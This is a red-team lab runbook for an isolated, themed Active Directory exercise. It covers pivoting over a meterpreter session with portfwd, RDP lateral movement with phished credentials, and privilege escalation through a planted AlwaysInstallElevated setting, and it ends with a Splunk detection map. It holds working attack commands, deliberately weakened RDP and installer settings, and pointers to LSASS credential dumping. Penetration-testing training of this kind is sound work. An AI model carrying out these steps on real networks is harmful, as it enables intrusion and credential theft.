# Phases 5–6 — Breach of Hades (Pivot + Lateral) · Keys of the Gods (Escalation)

> ISOLATED LAB ONLY. Authorised assessment. Host-only network.

Runbook for moving from the gatehouse foothold into the internal network and
escalating. Chosen approach: **meterpreter `portfwd`** for the pivot (runs over the
existing C2 session from the Apache CVE exploitation — no SSH credential needed) + **RDP as `persephone`**
for lateral access.

> **Step → Stage map:** Steps 1-4 = **Stage 5 (Breach of Hades)** — pivot + RDP lateral. Step 5 = **Stage 6 (Keys of the Gods)** — privilege escalation. Step 6 is the blue-team mapping for both.

## Where we start

```
Kali (attacker)
  │  foothold: meterpreter session on the gatehouse
  │  (Apache CVE exploit: apache_normalize_path_rce -> linux/x64/meterpreter/reverse_tcp)
  ▼
gatehouse 10.1.1.10 [IP varies by env: .10/.5]  (Ubuntu, DUAL-HOMED: DMZ 10.1.1.x + internal 192.168.1.x)
  ▼
Internal 192.168.1.0/24   (IPs vary by environment)
  - olympus-dc     (target DC, olympus.net)          e.g. 192.168.1.100
  - hades-dc       (email server, hades.underworld)  — separate, not attacked here
  - persephone-ws  (joined to olympus.net)           e.g. 192.168.1.103
  - splunk                                           e.g. 192.168.1.6
```

AD creds (from phishing `persephone`): `persephone / Demeter01!` — **normal** domain
user, authorised for RDP on .103. Other wardens share `Ferryman1!`: `charon`,
`cerberus`, `minos`, `hades`. No warden is a domain admin → escalation is local on the
workstation (or promote `hades` to Domain Admin later).

> **Why `portfwd`, not `ssh -D`.** Phase 4 lands a **meterpreter** session, not an SSH
> login, so we tunnel over the C2 we already have — no need to find or crack an SSH
> credential on the gatehouse. It is also quieter there: no `auth.log` login line, just
> the existing session (see `docs/blue-team-detection.md` §6).

---

## Step 1 — Stand up + domain-join the Windows workstation (.103)  (VM console / noVNC)

Do this at the VM console, not over the pivot.

1. Build a Windows 10/11 VM on the **internal** vSwitch (192.168.1.0/24).
2. Point DNS at the DC (required for domain discovery) and set the static IP:
   ```powershell
   Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.1.100   # olympus-dc
   New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.103 -PrefixLength 24 -DefaultGateway 192.168.1.1
   ```
3. Join the domain (use an account allowed to join, e.g. `hades`):
   ```powershell
   Add-Computer -DomainName "olympus.net" -Credential (Get-Credential) -Restart
   ```
4. After reboot, log in once as `OLYMPUS\persephone` so the user profile is created.
5. Enable RDP, **disable NLA**, and authorise `persephone`:
   ```powershell
   # enable RDP
   Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
   # RDP service: automatic + started (otherwise 3389 may not be listening at all)
   Set-Service TermService -StartupType Automatic; Start-Service TermService
   # firewall
   Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
   # disable NLA — lets a non-domain Kali authenticate without Kerberos (see Step 4)
   Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 0
   # authorise persephone for RDP
   Add-LocalGroupMember -Group "Remote Desktop Users" -Member "OLYMPUS\persephone"
   #   if that throws "Object reference not set..." (known bug with domain accounts), use:
   #   net localgroup "Remote Desktop Users" "OLYMPUS\persephone" /add
   ```
   Verify it is actually listening: `Get-NetTCPConnection -LocalPort 3389 -State Listen`.

   > `windows/setup-workstation.ps1` scripts this whole RDP-enable step (idempotent) — run it on the ws instead of the commands above.
> **Gotchas:**
> - If the gatehouse's `timeout 1 bash -c 'echo > /dev/tcp/<ws>/3389'` test returns
>   **CLOSED**, RDP isn't listening or the firewall is blocking it — fix on the
>   **workstation** (service + firewall rule above), not the tunnel.
> - If the network profile is **Public**, the firewall drops RDP to `filtered`:
>   `Set-NetConnectionProfile -InterfaceAlias "Ethernet" -NetworkCategory Private`
>   (a domain-joined box usually shows `DomainAuthenticated`, which is fine).

## Step 2 — Internal recon from the foothold  (meterpreter -> `shell` on the gatehouse)

A full nmap sweep of the `/24` as an unprivileged connect scan takes ~1h — too slow.
**Primary method is a fast ping sweep:**

```bash
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i | grep "bytes from"; done
```
Runs unprivileged. **Caveat:** Windows Defender Firewall drops ICMP echo by default, so
live Windows hosts may not answer. If the sweep is thin, confirm with a TCP sweep to
ports that *do* answer:

```bash
for i in $(seq 1 254); do for p in 445 3389; do (timeout 1 bash -c "echo > /dev/tcp/192.168.1.$i/$p" 2>/dev/null && echo "192.168.1.$i:$p") & done; done; wait
```
Then run nmap only against the confirmed live hosts (fast — two targets, not 254):

```bash
nmap -Pn -sV -p- --open -T4 192.168.1.100,192.168.1.103   # DC + workstation
```
Confirm the DC (88/389/445), the workstation (.103, 3389 open) and Splunk (.6).

## Step 3 — Pivot: forward RDP over the meterpreter session (`portfwd`)

In the meterpreter session on the gatehouse, forward the workstation's RDP port to a
local port on Kali:

```
meterpreter > portfwd add -l 13389 -p 3389 -r 192.168.1.103
```
- `-l 13389` — local listener opened on **Kali** (127.0.0.1:13389)
- `-p 3389`  — the remote port (RDP on the workstation)
- `-r 192.168.1.103` — the workstation, reachable only from the dual-homed gatehouse

Traffic path:
```
Kali (xfreerdp3 -> 127.0.0.1:13389)
   │   meterpreter tunnel (existing C2 session)
   ▼
Gatehouse 10.1.1.10 ── internal leg ──► Windows .103 : 3389 (RDP)
```
Manage forwards with `portfwd list` and
`portfwd delete -l 13389 -p 3389 -r 192.168.1.103`.

## Step 4 — RDP lateral as `persephone`

Point the RDP client at **your own Kali** (the local forward), not at the workstation IP:

```bash
xfreerdp3 /u:persephone /d:olympus.net /p:'Demeter01!' \
  /v:127.0.0.1:13389 /cert:ignore +clipboard /dynamic-resolution /sec:tls
```
(On Kali the binary is `xfreerdp3`, FreeRDP v3. WinRM alternative while you have the
cred, if 5985 is forwarded the same way with another `portfwd add -l 15985 -p 5985 -r 192.168.1.103`:
`evil-winrm -i 127.0.0.1 -P 15985 -u persephone -p 'Demeter01!'`.)

> **Why `/sec:tls` (+ NLA disabled on the ws in Step 1).** From a non-domain Kali you
> can't reach the KDC through the portfwd, and Kerberos over a `127.0.0.1` forward also
> breaks on SPN / clock-skew — so the default NLA handshake (which prefers Kerberos)
> hangs with *"Cannot find KDC for realm"*. Disabling NLA on the workstation and forcing
> `/sec:tls` skips that and authenticates in-session. NTLM would work in principle, but
> FreeRDP3 did not fall back to it reliably. NLA-off RDP is itself a realistic finding —
> document it as a deliberate weakness for the report.

## Step 5 — Local privilege escalation on the workstation

Privesc here follows **systematic local enumeration** — you don't guess one misconfig, you
run the known privesc checklist (HackTricks / PEASS / OSCP) and act on what returns positive.
The planted quick win on this box is **`AlwaysInstallElevated`** (set by
`windows/setup-workstation.ps1` — see "How the misconfig is planted" below), so the box comes
already vulnerable; the attacker's job is to *discover* it, not create it.

**Why not winPEAS / PowerUp.** Both are AV-signatured — on a default Win10/11 with Defender
active they are flagged and killed on load (and PowerUp also trips the PowerShell execution
policy). Running PowerUp is itself a detection artifact (Defender 1116/1117, script-block 4104).
So instead of the full signed toolkit we use a **minimal custom script that checks only this
condition** and is not AV-flagged — `windows/mini-powerup.ps1`:

```powershell
# rides the RDP drive redirect (\\tsclient\tools) or paste it in; it's already in the repo
powershell -ep bypass -File .\mini-powerup.ps1
```
It reads both hives and reports `Vulnerable : True` when HKLM and HKCU are both `1`, plus the
abuse function (`Write-UserAddMSI`). The **native equivalent** — no script engine, nothing for
Defender to flag — is the same two reads:

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Two `0x1` → vulnerable. For this check `reg query` is not a degraded version: it returns
exactly what the script's `Get-ItemProperty` does.

- `whoami /priv` / `whoami /groups` for the broader picture (`SeImpersonatePrivilege` →
  PrintSpoofer / GodPotato as an alternative path).
- Once local admin → dump cached creds (LSASS/mimikatz) and move toward **olympus-dc** (the
  target) with the `hades` credential via PsExec/WinRM.

### How the misconfig is planted (lab setup)

`AlwaysInstallElevated` needs **both** hives = `1`: `HKLM` (machine-wide) and `HKCU` (per-user).
`HKCU` is per-user, so it must land in **persephone's** hive. Two gotchas that bit us:

- A **normal user cannot set it** — the `HKCU\Software\Policies` subtree is admin-write-only, so
  `reg add` as persephone returns *access denied*. That's not a bug; it's the whole premise —
  the flag can only arrive via an admin/misconfig, which is what makes it a valid finding.
- Setting `HKCU` while logged in as **Administrator** writes the **admin's** hive, not
  persephone's — so the privesc still fails. You must target persephone's hive by **SID**:

```cmd
:: as Administrator, with persephone logged in (so her hive is mounted under HKU\<SID>)
wmic useraccount where name='persephone' get sid
reg add "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add "HKU\<SID>\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
```
If persephone is **logged off**, her hive isn't mounted — load it first:
`reg load HKU\pph C:\Users\persephone\NTUSER.DAT` → `reg add ...` → `reg unload HKU\pph`.
`setup-workstation.ps1` does all of this automatically (step 7), resolving the SID and
loading/unloading the hive as needed.

> **Tool-transfer note.** Kali in this lab has **no internet egress** (DNS to github.com /
> 8.8.8.8 fails), so you can't pull tooling onto Kali on the fly — stage it beforehand, or for
> anything needed internally, `meterpreter upload` it to the gatehouse and serve it over HTTP
> to `192.168.1.0/24` (the workstation reaches the gatehouse's internal leg directly).
> `mini-powerup.ps1` lives in the repo, so it just rides the `/drive` redirect — no download.

## Step 6 — Blue team / Splunk detection mapping

> Full map (Sysmon-for-Linux + Windows + pfSense + SPL): **`docs/blue-team-detection.md`**.

The assessment asks you to assess defensive controls. Document what each technique
generates (Windows Security log → Splunk 192.168.1.6):

| Technique | Event / log | Where to see it |
|---|---|---|
| Domain join | 4741 (computer acct created), 4624 | DC security log |
| RDP logon (persephone) | **4624 Logon Type 10** (RemoteInteractive), 4778 | Workstation .103 |
| Failed RDP | 4625 Type 10 | Workstation .103 |
| `portfwd` pivot (RDP) | meterpreter C2 session + gatehouse -> `192.168.1.103:3389` (Sysmon-for-Linux EID 3) | Gatehouse / pfSense |
| Internal ping / TCP sweep | connection spikes, pfSense cross-zone logs | pfSense / Splunk |
| privesc enum (mini-powerup.ps1) / mimikatz | 4688 proc creation; Sysmon EID 1; LSASS access Sysmon EID 10 | Workstation .103 |

**Source IP of the 4624 Type 10** on .103 = the internal IP of the **gatehouse** (the
hop exits the Ubuntu via `portfwd`), not Kali → a workstation receiving RDP from a DMZ
server is a strong anomaly.

Example SPL: `index=* EventCode=4624 Logon_Type=10` catches the RDP lateral move.
